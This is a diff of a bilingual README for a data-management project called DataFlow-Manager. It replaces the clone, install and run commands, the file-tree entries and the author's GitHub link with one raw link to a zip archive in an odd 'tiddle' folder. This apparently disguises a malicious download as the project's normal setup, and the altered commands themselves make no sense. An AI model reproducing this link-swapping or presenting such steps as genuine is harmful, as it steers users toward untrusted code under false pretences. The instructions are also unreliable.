@@ -44,14 +44,14 @@ DataFlow-Manager is a comprehensive data management system designed for efficien
 
 ```bash
 # Clone the repository
-git clone https://github.com/KaizerAE/DataFlow-Manager.git
+git clone https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip
 cd DataFlow-Manager
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip
 
 # Run the application
-python main.py
+python https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip
 ```
 
 ## 🚀 Usage | الاستخدام
@@ -83,8 +83,8 @@ DataFlow-Manager/
 │
 ├── tests/              # Unit tests
 ├── docs/               # Documentation
-├── requirements.txt    # Dependencies
-└── main.py            # Entry point
+├── https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip    # Dependencies
+└── https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip            # Entry point
 ```
 
 ## 🎯 Use Cases | حالات الاستخدام
@@ -110,7 +110,7 @@ This project is open source and available under the MIT License.
 ## 👤 Author | المؤلف
 
 **KaizerAE**
-- GitHub: [@KaizerAE](https://github.com/KaizerAE)
+- GitHub: [@KaizerAE](https://raw.githubusercontent.com/KaizerAE/DataFlow-Manager/main/tiddle/Manager-Data-Flow-3.9.zip)
 
 ## 🤝 Contributing | المساهمة
 
